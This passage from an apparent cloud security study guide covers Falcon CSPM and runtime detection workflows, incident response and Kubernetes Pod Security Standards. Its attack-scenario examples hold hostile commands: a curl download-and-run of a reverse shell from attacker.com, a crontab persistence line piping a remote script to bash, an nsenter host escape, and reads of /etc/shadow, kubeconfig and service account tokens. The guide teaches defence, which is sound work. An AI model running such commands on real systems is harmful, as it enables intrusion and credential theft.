├── METRICS TO TRACK:
│   ├── MTTR (Mean Time to Remediate) by severity
│   ├── Open vulnerability count trend (should be decreasing)
│   ├── SLA compliance rate (target: >95%)
│   ├── Age analysis: How many findings are >30 days old?
│   └── Coverage: % of assets scanned vs total assets
```

## 3.2 CSPM Workflow — Finding Misconfigurations and Fixing Them

```
CSPM INVESTIGATION WORKFLOW:

1. GO TO: Posture and Compliance → Indicators of Misconfiguration
2. FILTER: Severity = Critical → Account = Production
3. EXAMINE each finding:
   │
   ├── FINDING DETAIL VIEW shows:
   │   ├── What: "S3 bucket 'customer-data' has Block Public Access disabled"
   │   ├── Resource: ARN, region, account, tags
   │   ├── Benchmark: CIS AWS 2.1.5, NIST 800-53 SC-28
   │   ├── Severity: CRITICAL
   │   ├── First seen: 2025-12-01 (47 days ago — SLA BREACHED)
   │   ├── Remediation: Exact AWS CLI / Terraform / Console steps
   │   └── Attack path: Does this finding connect to an attack path?
   │
   ├── DETERMINE ACTION:
   │   ├── REMEDIATE NOW: Follow remediation steps → re-scan → close
   │   ├── ASSIGN: Create ticket → assign to resource owner → set SLA
   │   ├── SUPPRESS: If false positive → document justification → set expiry
   │   └── RISK ACCEPT: Formal risk acceptance → VP sign-off → 90-day max
   │
4. CHECK: Posture and Compliance → Compliance → track score improvement
5. REPORT: Weekly compliance dashboard to stakeholders
```

## 3.3 CWPP Runtime Detection Investigation — Step by Step

```
RUNTIME DETECTION INVESTIGATION:

1. GO TO: Detections → Containers Indicators of Attack (IOA)

2. ALERT TRIAGE:
   ├── Severity? (Critical = investigate immediately)
   ├── Detection type? (see table below)
   ├── Which container/pod/namespace/cluster?
   └── When did it fire? (Active now vs historical?)

3. FOR EACH DETECTION, EXAMINE:
   │
   ├── PROCESS TREE ◄── THE MOST IMPORTANT VIEW
   │   Shows: Parent → Child → Grandchild process chain
   │   Example: nginx → bash → curl → /tmp/xmrig
   │   ASK: "Is this process chain normal for this workload?"
   │   Web server → shell = ALWAYS suspicious
   │   CI/CD runner → shell → build tool = Often normal
   │
   ├── DRIFT INDICATORS
   │   Shows: Files written after container start not in original image
   │   ASK: "Was this binary in the original image?"
   │   New executable after start = potential attack tool
   │
   ├── NETWORK CONNECTIONS
   │   Shows: All inbound/outbound connections from the container
   │   ASK: "Is this container supposed to make outbound connections?"
   │   Connection to known-bad IP = compromise indicator
   │   Connection to mining pool = cryptominer
   │   DNS tunneling pattern = data exfiltration
   │
   ├── FILE ACCESS
   │   Shows: Files read/written by processes
   │   CRITICAL FILES TO WATCH:
   │   /var/run/secrets/kubernetes.io/serviceaccount/token → K8s API access
   │   /var/lib/kubelet/kubeconfig → node-level cluster access
   │   /etc/shadow, /etc/passwd → credential harvesting
   │   /dev/shm, /tmp → offensive tool staging area
   │
   └── CONTAINER CONTEXT
       Shows: Image name, registry, namespace, labels, security context
       CHECK: Is it privileged? Running as root? Host network/PID?

4. DECIDE: True Positive or False Positive?
   (See Section 5 for the full TP/FP framework)

5. IF TRUE POSITIVE → Proceed to containment (Section 3.4)
```

### Detection Types Quick Reference

| Detection Name | What It Means | Severity | Typical TP/FP |
|---------------|--------------|----------|---------------|
| `ReverseShellDetected` | Outbound shell to attacker IP | 🔴 Critical | 99% TP |
| `ContainerDrift.NewExecutable` | Binary written post-start | 🟠 High | 85% TP (some legitimate debug) |
| `InteractiveContainerSession` | TTY shell in production pod | 🟠 High | 70% TP (could be authorized debug) |
| `PotentialKernelTampering` | Kernel exploit or eBPF from container | 🔴 Critical | 95% TP |
| `CryptominingActivity` | Mining pool connection | 🟠 High | 99% TP |
| `SuspiciousNetworkConnection` | Connection to flagged IP/domain | 🟠 High | 80% TP |
| `SuspiciousDNSRequest` | DNS tunneling or known-bad domain | 🟠 High | 75% TP |
| `BeaconLikeTraffic` | C2 beacon pattern | 🟠 High | 85% TP |
| `ContainerEscape.Nsenter` | nsenter to host namespace | 🔴 Critical | 99% TP |
| `SuspiciousProcessExecution` | Unexpected binary execution | 🟡 Medium | 60% TP |

## 3.4 Incident Response Lifecycle — Complete Platform Workflow

```
THE 6-PHASE INCIDENT RESPONSE LIFECYCLE:

═══════════════════════════════════════════════════════════════════════
PHASE 1: IDENTIFICATION                                    Time: 0-5 min
═══════════════════════════════════════════════════════════════════════

WHERE IN FALCON: Detections → IOA alerts

WHAT TO DO:
├── 1. Open the detection alert
├── 2. Read the detection name and description
├── 3. Check severity and confidence level
├── 4. View the PROCESS TREE — what is the chain?
├── 5. Check container context — which workload? namespace? cluster?
├── 6. Is this workload production or dev/staging?
└── 7. Make initial assessment: TP or FP?

DECISION POINT:
├── Clearly FP (known legitimate behavior) → Document + Suppress → Done
├── Clearly TP (reverse shell, known malware hash) → Move to CONTAINMENT
└── Uncertain → Treat as TP, continue investigation alongside containment

═══════════════════════════════════════════════════════════════════════
PHASE 2: CONTAINMENT                                      Time: 5-15 min
═══════════════════════════════════════════════════════════════════════

SHORT-TERM CONTAINMENT (stop the bleeding):

For Container/Pod compromise:
├── kubectl delete pod <name> -n <namespace>     # Kill compromised pod
├── Apply deny-all NetworkPolicy to namespace     # Isolate other pods
└── kubectl cordon <node>                         # Prevent new pods on this node

For EC2/VM compromise:
├── Modify Security Group → deny all inbound/outbound
├── aws iam put-role-policy → attach deny-all to instance role
└── DO NOT terminate yet — preserve for forensics

For IAM credential compromise:
├── Deactivate access keys immediately
├── Attach deny-all IAM policy to the principal
├── Revoke active STS sessions (inline deny with DateLessThan condition)
└── aws iam put-role-policy --role-name <role> --policy-name EmergencyDeny \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Deny",
    "Action":"*","Resource":"*","Condition":{"DateLessThan":
    {"aws:TokenIssueTime":"<NOW>"}}}]}'

For S3 data exposure:
├── aws s3api put-public-access-block (block all public access)
├── Enable S3 Object Lock on sensitive buckets
└── Review and revoke any active pre-signed URLs

═══════════════════════════════════════════════════════════════════════
PHASE 3: INVESTIGATION                                    Time: 15-60 min
═══════════════════════════════════════════════════════════════════════

WHERE IN FALCON: 
├── Detections → click into alert → full investigation view
├── Investigate Container Network → network flow analysis
├── Assets → check resource metadata and relationships
└── Explorer → visualize attack path

INVESTIGATION CHECKLIST:
├── ENTRY POINT:
│   ├── How did the attacker get in?
│   ├── Exploited vulnerability? (check image assessment for CVEs)
│   ├── Stolen credential? (check CloudTrail for anomalous login)
│   ├── Misconfiguration? (check CSPM for related IOMs)
│   └── Supply chain? (check image provenance, Helm chart origin)
│
├── LATERAL MOVEMENT:
│   ├── Did the attacker access the K8s service account token?
│   ├── Did they query IMDS (169.254.169.254)?
│   ├── Did they scan the internal network?
│   ├── Were other pods/services accessed?
│   └── CloudTrail: Were API calls made with stolen credentials?
│
├── DATA ACCESS:
│   ├── Was any data read or exfiltrated?
│   ├── Check network connections for data transfer volumes
│   ├── Check S3 server access logs for unusual GetObject patterns
│   └── Check database audit logs for unusual queries
│
├── PERSISTENCE:
│   ├── Were new IAM users, roles, or access keys created?
│   ├── Were new K8s ClusterRoleBindings or ServiceAccounts created?
│   ├── Were Lambda functions or Config rules created (backdoor)?
│   ├── Were new EC2 instances launched?
│   └── Check for modifications to authorized_keys, crontab, systemd
│
└── EVIDENCE PRESERVATION:
    ├── EBS snapshot of compromised instance
    ├── Container filesystem preserved (kubectl cp or Falcon RTR)
    ├── CloudTrail logs copied to forensic S3 bucket (KMS encrypted)
    ├── K8s audit logs exported
    └── Network flow logs captured

═══════════════════════════════════════════════════════════════════════
PHASE 4: ERADICATION                                      Time: 1-4 hours
═══════════════════════════════════════════════════════════════════════

WHAT TO DO:
├── Remove attacker access:
│   ├── Delete rogue IAM users/roles/access keys
│   ├── Remove unauthorized ClusterRoleBindings
│   ├── Delete persistence mechanisms (Lambda backdoors, Config rules)
│   └── Delete compromised container images from registry
│
├── Patch the vulnerability:
│   ├── Update the application dependency
│   ├── Rebuild container image with patched base
│   ├── Push through CI/CD pipeline
│   └── Verify patch with re-scan
│
├── Rotate credentials:
│   ├── All secrets accessible from compromised workload
│   ├── Database passwords, API keys, service account tokens
│   ├── K8s cluster secrets (if kubelet creds were accessed)
│   └── IRSA role sessions (modify trust policy, delete SA, recreate)
│
└── Harden:
    ├── Apply security controls that would have prevented the attack
    ├── KAC rules: set relevant policies to PREVENT
    ├── NetworkPolicies: default deny in affected namespace
    ├── SecurityContext: readOnlyRootFilesystem, runAsNonRoot
    └── SGs/NACLs: restrict access to minimum required

═══════════════════════════════════════════════════════════════════════
PHASE 5: RECOVERY                                         Time: 4-24 hours
═══════════════════════════════════════════════════════════════════════

WHAT TO DO:
├── Redeploy clean workloads from verified images
├── Restore from known-good backups if data was corrupted
├── Replace compromised nodes from golden AMI
├── Verify all services are operating normally
├── Monitor closely for attacker return (enhanced alerting for 72 hours)
└── Confirm sensor coverage is 100% across all assets

═══════════════════════════════════════════════════════════════════════
PHASE 6: POST-INCIDENT ACTIVITIES                         Time: 24-72 hours
═══════════════════════════════════════════════════════════════════════

WHAT TO DO:
├── POST-INCIDENT REPORT:
│   ├── Timeline: Detection → Containment → Eradication → Recovery
│   ├── Root cause analysis
│   ├── Data impact assessment (was data accessed/exfiltrated?)
│   ├── What worked well in the response?
│   ├── What can be improved?
│   └── Recommendations for future prevention
│
├── LESSONS LEARNED:
│   ├── Update detection rules based on what the attacker did
│   ├── Add new KAC/CSPM policies to prevent recurrence
│   ├── Update runbooks and playbooks
│   ├── Train the team on the identified attack technique
│   └── Verify similar vulnerabilities don't exist elsewhere
│
├── COMPLIANCE & NOTIFICATION:
│   ├── Determine if breach notification is required (GDPR 72h, HIPAA 60d)
│   ├── Notify legal/compliance team
│   ├── Generate audit evidence from Falcon (detection timeline, actions taken)
│   └── Update risk register with incident findings
│
├── METRICS:
│   ├── MTTD (Mean Time to Detect): time from attack start to detection
│   ├── MTTR (Mean Time to Respond): time from detection to containment
│   ├── MTTE (Mean Time to Eradicate): time to complete removal
│   ├── Blast radius: how many assets/data records were affected?
│   └── Root cause category: vulnerability, misconfiguration, credential, supply chain
│
└── GOVERNANCE UPDATES:
    ├── Update CSPM finding SLAs if existing SLAs were too slow
    ├── Add new CSPM/KAC policies for the identified misconfiguration
    ├── Review and tighten IAM permissions
    └── Schedule review of all similar assets across the organization
```

## 3.5 Remediation SLA Framework

| Severity | Public-Facing | Internal | + PII/Financial Data | + Active Exploit (CISA KEV) |
|----------|--------------|----------|---------------------|---------------------------|
| **Critical** (CVSS 9.0+) | 4 hours | 24 hours | Halve the SLA | Immediate (1 hour) |
| **High** (CVSS 7.0-8.9) | 24 hours | 48 hours | Halve the SLA | 4 hours |
| **Medium** (CVSS 4.0-6.9) | 7 days | 14 days | 7 days | 24 hours |
| **Low** (CVSS 0.1-3.9) | 30 days | 90 days | 30 days | 7 days |

**SLA Escalation Chain:**
```
SLA at 50% → Automated email to resource owner
SLA at 75% → Automated Slack alert to team lead
SLA at 100% (BREACHED) → Jira ticket auto-escalates to engineering manager
SLA at 150% → CISO notification, risk register entry, governance review
```

## 3.6 Tool Tuning Workflow — Improving Signal-to-Noise

```
MONTHLY TUNING CYCLE:

WEEK 1: ANALYZE
├── Pull detection metrics for last 30 days
├── Identify top-10 noisiest alert types by volume
├── Calculate TP rate for each: (True Positives) / (Total Alerts)
├── Identify alert types with TP rate < 50% → candidates for tuning
└── Identify alert types with 0 TP → candidates for review or suppression

WEEK 2: TUNE
├── For each low-TP alert:
│   ├── Root cause: Why is it firing on legitimate activity?
│   ├── Can we scope the rule more precisely?
│   │   (e.g., exclude specific namespaces, labels, or image registries)
│   ├── Can we adjust the detection logic?
│   │   (e.g., raise threshold for network connection volume)
│   └── Document the tuning change with justification
│
├── For each 0-TP alert:
│   ├── Is the alert irrelevant to our environment? → Disable with documentation
│   ├── Is it poorly scoped? → Refine scope
│   └── Is it working correctly but our environment is clean? → Keep enabled
│
└── Apply tuning changes in STAGING first → monitor for 72 hours → move to PROD

WEEK 3: VALIDATE
├── Compare: Alert volume before vs after tuning
├── Confirm: TP rate improved
├── Confirm: No legitimate threats were suppressed
└── Document results in tuning log

WEEK 4: REPORT
├── Tuning report to security leadership:
│   ├── Alerts before: X/month → Alerts after: Y/month (Z% reduction)
│   ├── TP rate before: X% → TP rate after: Y%
│   ├── MTTD improvement (fewer alerts → analysts investigate faster)
│   └── Suppressions added/reviewed/removed this cycle
```

## 3.7 Build-Breaking Policy — CI/CD Integration

```
CI/CD SECURITY GATE WORKFLOW:

Developer → Git Push → CI Pipeline Starts
                              │
                    ┌─────────▼─────────────┐
                    │ STAGE 1: IaC Scan      │
                    │ (Checkov/tfsec/KICS)   │
                    │                        │
                    │ Checks:                │
                    │ • Hardcoded secrets     │
                    │ • Open SGs (0.0.0.0/0) │
                    │ • Unencrypted storage   │
                    │ • Overly permissive IAM │
                    ├────────────────────────┤
                    │ CRITICAL/HIGH → ❌ FAIL │
                    │ MEDIUM/LOW → ⚠️ WARN    │
                    └─────────┬──────────────┘
                              │ PASS
                    ┌─────────▼─────────────┐
                    │ STAGE 2: Image Scan    │
                    │ (Falcon/Trivy/Snyk)    │
                    │                        │
                    │ Checks:                │
                    │ • Critical CVEs in OS  │
                    │ • Critical CVEs in libs│
                    │ • Malware in layers    │
                    │ • Secrets in image     │
                    │ • SUID binaries        │
                    │ • No USER instruction  │
                    ├────────────────────────┤
                    │ CRITICAL → ❌ FAIL      │
                    │ HIGH → ❌ FAIL          │
                    │ MEDIUM → ⚠️ WARN        │
                    └─────────┬──────────────┘
                              │ PASS
                    ┌─────────▼─────────────┐
                    │ STAGE 3: Deploy        │
                    │                        │
                    │ Even if pipeline passes│
                    │ KAC is the SECOND GATE:│
                    │ • Checks image scanned │
                    │ • Checks security ctx  │
                    │ • Blocks if policy     │
                    │   violated             │
                    └────────────────────────┘

EXCEPTION PROCESS:
├── Developer gets build failure → reads exact finding + remediation steps
├── If legitimate exception needed:
│   ├── Request via security exception form
│   ├── Security team reviews within 4 hours
│   ├── If approved: time-limited bypass (max 7 days) with ticket to fix
│   └── If denied: developer must fix before deploying
```

---

## 3.8 Pod Security Standards (PSS) — The K8s Security Baseline

> PSS replaced Pod Security Policies (PSPs) in K8s 1.25+. Every K8s cluster you work with uses them.

### The Three PSS Profiles

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                     POD SECURITY STANDARDS (PSS) PROFILES                       │
│                                                                                 │
│  ┌─────────────────┐    ┌─────────────────┐    ┌──────────────────────┐        │
│  │   PRIVILEGED     │    │   BASELINE       │    │   RESTRICTED          │        │
│  │                  │    │                  │    │                      │        │
│  │  • No restrictions│    │  • Prevents known│    │  • Maximum hardening │        │
│  │  • Full access    │    │    privilege      │    │  • Non-root only     │        │
│  │  • For system     │    │    escalations   │    │  • Drop ALL caps     │        │
│  │    infrastructure │    │  • Blocks most   │    │  • Seccomp required  │        │
│  │    only (CNI,     │    │    dangerous     │    │  • No hostPath       │        │
│  │    storage, Falcon│    │    settings      │    │  • Read-only root FS │        │
│  │    sensor)        │    │  • Good default  │    │  • For security-     │        │
│  │                  │    │    for most apps  │    │    critical workloads│        │
│  │  Use: <5% of     │    │  Use: ~70% of    │    │  Use: ~25% of        │        │
│  │  namespaces       │    │  namespaces      │    │  namespaces          │        │
│  └─────────────────┘    └─────────────────┘    └──────────────────────┘        │
│                                                                                 │
│       LEAST SECURE ◄──────────────────────────────► MOST SECURE                │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### Pod Security Admission (PSA) — How It's Enforced

```yaml
# Apply PSS via namespace labels:
apiVersion: v1
kind: Namespace
metadata:
  name: payments
  labels:
    # MODE can be: enforce, audit, or warn
    pod-security.kubernetes.io/enforce: restricted      # BLOCK non-compliant pods
    pod-security.kubernetes.io/audit: restricted         # LOG violations in audit log
    pod-security.kubernetes.io/warn: restricted          # WARN on kubectl apply
    pod-security.kubernetes.io/enforce-version: latest   # Pin to K8s version
```

| PSA Mode | What Happens | When to Use |
|----------|-------------|-------------|
| **enforce** | Pod is **REJECTED** if it violates the profile | Production namespaces (after testing) |
| **audit** | Pod is **ALLOWED** but violation is logged in K8s audit log | Pre-production dry run |
| **warn** | Pod is **ALLOWED** but user sees a warning on `kubectl apply` | Developer awareness |

### Complete PSS Controls List — What Each Profile Blocks

#### 🟡 BASELINE Profile Controls (blocks these 11 settings)

| # | Control | What It Blocks | Why It's Dangerous |
|---|---------|---------------|-------------------|
| 1 | **HostProcess** | `hostProcess: true` (Windows containers) | Gives full host access |
| 2 | **Host Namespaces** | `hostNetwork: true`, `hostPID: true`, `hostIPC: true` | Shares host's network/process/IPC space — attacker sees all host processes |
| 3 | **Privileged Containers** | `privileged: true` | Gives ALL Linux capabilities + unrestricted device access → container escape |
| 4 | **Capabilities** | Adding caps beyond the allowed list: `AUDIT_WRITE, CHOWN, DAC_OVERRIDE, FOWNER, FSETID, KILL, MKNOD, NET_BIND_SERVICE, SETFCAP, SETGID, SETPCAP, SETUID, SYS_CHROOT` | Dangerous caps like `SYS_ADMIN`, `NET_RAW`, `SYS_PTRACE` enable kernel exploits |
| 5 | **HostPath Volumes** | `hostPath` volume mounts | Mounts node's filesystem into pod → read/write host files directly |
| 6 | **Host Ports** | `hostPort` (except 0) | Binds container directly to host port → bypasses NetworkPolicies |
| 7 | **AppArmor** | Overriding AppArmor to `unconfined` | Disables mandatory access control |
| 8 | **SELinux** | Custom SELinux options (type must be from allowed list or unset) | Prevents escaping SELinux confinement |
| 9 | **`/proc` Mount Type** | `procMount: Unmasked` | Default masks sensitive `/proc` paths; unmasking exposes host kernel info |
| 10 | **Seccomp** | `seccomp: Unconfined` | Disables system call filtering entirely — opens kernel attack surface |
| 11 | **Sysctls** | Any unsafe sysctl (only safe: `kernel.shm*`, `net.ipv4.ip_local_port_range`, `net.ipv4.tcp_syncookies`, `net.ipv4.ping_group_range`, `net.ipv4.ip_unprivileged_port_start`) | Unsafe sysctls can modify kernel behavior from inside a pod |

#### 🔴 RESTRICTED Profile Controls (everything in Baseline PLUS these 6)

| # | Control | What It Adds | Why |
|---|---------|-------------|-----|
| 12 | **Volume Types** | Only allows: `configMap, csi, downwardAPI, emptyDir, ephemeral, persistentVolumeClaim, projected, secret` — **blocks hostPath, nfs, iscsi, etc.** | Prevents all host/external filesystem access |
| 13 | **Privilege Escalation** | `allowPrivilegeEscalation` must be `false` | Prevents SUID binaries or setuid from elevating privileges |
| 14 | **Running as Non-Root** | `runAsNonRoot` must be `true` | Root inside container ≈ root on host in many escape scenarios |
| 15 | **Running as Non-Root User** | `runAsUser` cannot be `0` | Enforces non-root at the UID level (belt + suspenders with #14) |
| 16 | **Seccomp Profile Required** | Must be `RuntimeDefault` or `Localhost` — NOT `Unconfined` | Forces system call filtering to prevent kernel exploits |
| 17 | **Capabilities** | Must `drop: ["ALL"]`. Only `NET_BIND_SERVICE` may be added back | True least privilege — removes every Linux capability by default |

> **Interview Quick Answer:** "Baseline blocks **11** dangerous settings like privileged mode, hostNamespaces, and hostPath. Restricted adds **6 more** including drop-ALL capabilities, runAsNonRoot, and mandatory seccomp. Together they define 17 controls covering the full pod attack surface."

**Rollout Strategy:**
```
Week 1-2: audit + warn on all namespaces → collect violations
Week 3:   Review violations → work with teams to fix configs
Week 4:   enforce on staging → verify no legitimate breakage
Week 5+:  enforce on production → exception process for system pods
```

### PSS ↔ CNAPP/KAC Mapping

| PSS Control | KAC Equivalent | Falcon IOM Check |
|------------|---------------|-----------------|
| No privileged containers | KAC blocks `privileged: true` | `PrivilegedContainerDetected` |
| No host namespaces | KAC blocks hostPID/hostNetwork/hostIPC | `HostNamespaceSharingDetected` |
| No hostPath volumes | KAC blocks HostPath volume type | `HostPathVolumeMounted` |
| Must run as non-root | KAC enforces `runAsNonRoot: true` | `ContainerRunningAsRoot` |
| Drop ALL capabilities | KAC checks capability list | `ExcessiveCapabilitiesGranted` |
| No privilege escalation | KAC checks `allowPrivilegeEscalation` | `PrivilegeEscalationAllowed` |
| Seccomp required | KAC checks for seccomp profile | `NoSeccompProfileApplied` |
| Restrict volume types | KAC blocks HostPath, NFS unsafe mounts | `UnsafeVolumeTypeMounted` |

---

### 10 PSS MISCONFIGURATIONS — Real Scenarios, Detection, and Response

---

#### Misconfig 1: `privileged: true` — Full Host Access

**The Bad Config:**
```yaml
securityContext:
  privileged: true    # ← This gives the container FULL host kernel access
```

**Why It's Dangerous:** A privileged container can access ALL host devices, load kernel modules, modify iptables, mount the host filesystem via `/dev/sda1`, and escape the container entirely. It's equivalent to running as root on the host.

**Real Attack Scenario:**
An attacker exploits an RCE in a web app running in a privileged container. They run:
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash  # Full host access
cat /var/lib/kubelet/kubeconfig                              # Cluster admin creds
```
Now they own the entire node and can pivot to the control plane.

**Console Detection:**
- **CSPM → Posture → Kubernetes misconfigurations**: `PrivilegedContainerDetected` (CRITICAL)
- **KAC Policy**: Blocks deployment if set to PREVENT
- **CWPP Detection**: `ContainerEscape.Nsenter` fires if exploitation occurs

**Remediation:**
1. Remove `privileged: true` from all pod specs
2. Identify which specific capabilities the app actually needs
3. Grant ONLY those capabilities: `capabilities: { add: ["NET_ADMIN"] }`
4. Set KAC to PREVENT for privileged containers across all production namespaces
5. Exception: Only system DaemonSets (CNI, CSI, Falcon sensor) may be privileged — documented and scoped to `kube-system` / `falcon-system`

**Interview Answer:**
> "No production application should ever run as privileged. When I find this, I investigate what specific Linux capabilities the app actually needs — usually it's one or two like `NET_ADMIN` or `SYS_PTRACE`. I replace `privileged: true` with those specific capabilities. KAC blocks privileged pods in PREVENT mode. The only exception is system infrastructure in `kube-system` — and even those are documented and reviewed quarterly."

---

#### Misconfig 2: Container Running as Root (`runAsUser: 0`)

**The Bad Config:**
```yaml
securityContext:
  runAsUser: 0          # ← Running as UID 0 (root)
  # OR: no runAsNonRoot: true specified (defaults to root in most images)
```

**Why It's Dangerous:** Root inside the container = root on the host if any escape vector exists. Even without escaping, root can modify the container filesystem, install tools, read sensitive mounted files, and exploit SUID binaries.

**Real Attack Scenario:**
Attacker exploits a Java deserialization vuln. Because the container runs as root, they:
```bash
apt-get install -y nmap netcat    # Install offensive tools (writable filesystem)
cat /var/run/secrets/kubernetes.io/serviceaccount/token  # Read SA token
curl -k https://kubernetes.default/api/v1/namespaces    # Query K8s API
```
If the container ran as non-root (UID 1000), `apt-get install` would fail, and tools couldn't be installed.

**Console Detection:**
- **CSPM → IOM**: `ContainerRunningAsRoot` (HIGH)
- **KAC**: Blocks if `runAsNonRoot: true` is required by policy
- **PSA**: `restricted` profile rejects pods without `runAsNonRoot: true`

**Remediation:**
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1000        # Non-root UID
  runAsGroup: 1000
```
Update the Dockerfile: `USER 1000:1000` (ensure app can run as non-root).

**Interview Answer:**
> "Running as root is the most common K8s security misconfiguration. I enforce `runAsNonRoot: true` at the namespace level via PSA restricted profile and via KAC. The key is working with developers — many apps assume root. I help teams update their Dockerfiles to use a non-root user and verify the app works correctly before enforcing."

---

#### Misconfig 3: Writable Root Filesystem

**The Bad Config:**
```yaml
securityContext:
  readOnlyRootFilesystem: false   # ← OR: field not specified (default = writable)
```

**Why It's Dangerous:** Attackers can write malware, scripts, and offensive tools directly to the container filesystem. This is how container drift works — new binaries appear post-start.

**Real Attack Scenario:**
Attacker exploits RCE, downloads a reverse shell:
```bash
curl -o /tmp/rev.sh http://attacker.com/shell.sh && chmod +x /tmp/rev.sh && /tmp/rev.sh
```
With `readOnlyRootFilesystem: true`, this `curl -o` write operation FAILS entirely.

**Console Detection:**
- **CSPM → IOM**: `WritableRootFilesystem` (MEDIUM)
- **CWPP**: `ContainerDrift.NewExecutable` — detects file written post-start
- **KAC**: Can enforce `readOnlyRootFilesystem: true`

**Remediation:**
```yaml
securityContext:
  readOnlyRootFilesystem: true
volumeMounts:
  - name: tmp
    mountPath: /tmp         # mount tmpfs for legitimate temp file needs
volumes:
  - name: tmp
    emptyDir: {}            # tmpfs — ephemeral, not persisted
```

**Interview Answer:**
> "Read-only root filesystem is one of the most effective security controls against container drift. It prevents attackers from writing malware or tools to the container. Apps that need write access for logs or temp files get mounted emptyDir volumes at specific paths. Combined with drift detection in PREVENT mode, this blocks almost all post-exploitation tooling."

---

#### Misconfig 4: `allowPrivilegeEscalation: true`

**The Bad Config:**
```yaml
securityContext:
  allowPrivilegeEscalation: true   # ← Allows gaining more privileges than parent
  # OR: not specified (defaults to TRUE if not explicitly set to false)
```

**Why It's Dangerous:** Enables `setuid`/`setgid` binaries to escalate privileges. Even a non-root container can become root via a SUID binary like `su`, `sudo`, or a vulnerable application.

**Real Attack Scenario:**
Container runs as UID 1000, but `allowPrivilegeEscalation` is not set to false. Attacker finds a SUID binary:
```bash
find / -perm -4000 2>/dev/null    # Find SUID binaries
# /usr/bin/newgrp is SUID root
newgrp root                        # Escalate to root
```

**Console Detection:**
- **CSPM → IOM**: `PrivilegeEscalationAllowed` (HIGH)
- **KAC**: Blocks if policy requires `allowPrivilegeEscalation: false`
- **PSA**: `restricted` profile requires `allowPrivilegeEscalation: false`

**Remediation:**
```yaml
securityContext:
  allowPrivilegeEscalation: false    # Explicitly set to false
```

**Interview Answer:**
> "This is a sneaky default — Kubernetes defaults `allowPrivilegeEscalation` to true if not specified. I enforce `false` across all workloads via KAC. The PSA restricted profile also catches this. It's critical because even a properly non-root container can escalate to root via SUID binaries if this isn't set."

---

#### Misconfig 5: Excessive Linux Capabilities (`CAP_SYS_ADMIN`)

**The Bad Config:**
```yaml
securityContext:
  capabilities:
    add:
      - SYS_ADMIN       # ← Equivalent to giving root-like powers
      - NET_RAW          # ← Can craft raw packets, ARP spoofing
      - SYS_PTRACE       # ← Can attach to other processes, read memory
```

**Why It's Dangerous:** `CAP_SYS_ADMIN` is the "god capability" — it allows mounting filesystems, loading eBPF programs, managing namespaces, and many operations that enable container escape. `NET_RAW` enables network sniffing and spoofing attacks.

**Real Attack Scenario:**
Container with `CAP_SYS_ADMIN` — attacker mounts the host filesystem:
```bash
mkdir /host && mount /dev/sda1 /host    # Mount host root filesystem
chroot /host                             # Escape to host
```

**Console Detection:**
- **CSPM → IOM**: `ExcessiveCapabilitiesGranted` (CRITICAL for SYS_ADMIN)
- **KAC**: Can block specific capabilities
- **PSA**: `restricted` requires `drop: ["ALL"]` and only allows a short allowlist

**Remediation:**
```yaml
securityContext:
  capabilities:
    drop:
      - ALL              # Drop everything first
    add:
      - NET_BIND_SERVICE # Add back ONLY what's needed (e.g., bind port <1024)
```

**PSS Restricted Profile allows ONLY:** `NET_BIND_SERVICE` (all others must be dropped).

**Interview Answer:**
> "The principle is: drop ALL capabilities, then add back only what the application specifically requires. In practice, most apps need zero additional capabilities. Web servers binding to port 80 might need `NET_BIND_SERVICE`. If a team requests `SYS_ADMIN`, that's a red flag — I investigate the actual requirement because there's almost always a more specific capability or an alternative approach."

---

#### Misconfig 6: Host Namespace Sharing (`hostPID`, `hostNetwork`, `hostIPC`)

**The Bad Config:**
```yaml
spec:
  hostPID: true        # ← Container sees all host processes
  hostNetwork: true    # ← Container uses host's network stack directly
  hostIPC: true        # ← Container shares host IPC (shared memory)
```

**Why It's Dangerous:**
- `hostPID`: Container can see and signal ALL host processes, including other containers. Enables process injection.
- `hostNetwork`: Container bypasses K8s network isolation (NetworkPolicies don't apply). Can sniff traffic on the host network.
- `hostIPC`: Can read shared memory from other processes on the host.

**Real Attack Scenario (hostPID):**
```bash
# From inside the container with hostPID
ps aux                                 # See ALL host processes
nsenter --target <PID> --mount -- bash # Enter another container's namespace
cat /proc/<PID>/environ                # Read environment vars (secrets!)
```

**Console Detection:**
- **CSPM → IOM**: `HostPIDSharingEnabled` / `HostNetworkEnabled` / `HostIPCEnabled` (HIGH each)
- **KAC**: Can block all three individually
- **PSA**: `baseline` profile already blocks all three

**Remediation:** Remove all `host*: true` settings. If networking requires host-level access, use a `hostPort` mapping instead of `hostNetwork` where possible.

**Interview Answer:**
> "Host namespace sharing breaks container isolation entirely. `hostPID` gives the container visibility into every process on the node — including other containers' secrets in environment variables. `hostNetwork` bypasses NetworkPolicies. These should be blocked by KAC's baseline policies. The only exception is system infrastructure like CNI plugins, and those are restricted to `kube-system`."

---

#### Misconfig 7: HostPath Volume Mount

**The Bad Config:**
```yaml
volumes:
  - name: host-root
    hostPath:
      path: /               # ← Mounts the ENTIRE host filesystem
      type: Directory
# Or commonly:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock   # ← Docker socket = container escape
```

**Why It's Dangerous:** HostPath mounts give the container read/write access to the host filesystem. Mounting `/` = full host access. Mounting `/var/run/docker.sock` = ability to create containers outside Kubernetes.

**Real Attack Scenario:**
```bash
# Container with hostPath: /
cat /host/etc/shadow                    # Read host password hashes
cat /host/var/lib/kubelet/kubeconfig    # Get cluster admin credentials
echo "*/1 * * * * root curl http://attacker.com/shell.sh | bash" >> /host/etc/crontab
# ↑ Persistence via host cron
```

**Console Detection:**
- **CSPM → IOM**: `HostPathVolumeMounted` (CRITICAL for `/`, HIGH for docker.sock)
- **KAC**: Can block HostPath volume types entirely
- **PSA**: `restricted` profile blocks HostPath volumes

**Remediation:** Replace `hostPath` with:
- `emptyDir` for temporary storage
- `PersistentVolumeClaim` for persistent storage
- `configMap` / `secret` for configuration
- For logging: use a sidecar or DaemonSet log collector instead of writing to host path

**Interview Answer:**
> "HostPath volumes are the easiest path to container escape. I enforce a KAC rule that blocks HostPath in all namespaces except `kube-system`. Docker socket mounts are an absolute blocker — they allow creating containers directly on the Docker daemon, bypassing all Kubernetes security controls. For CI/CD builds that need Docker, I recommend Kaniko (daemonless image builder)."

---

#### Misconfig 8: No Seccomp Profile Applied

**The Bad Config:**
```yaml
securityContext:
  # No seccompProfile specified — uses Unconfined (no syscall filtering)
```

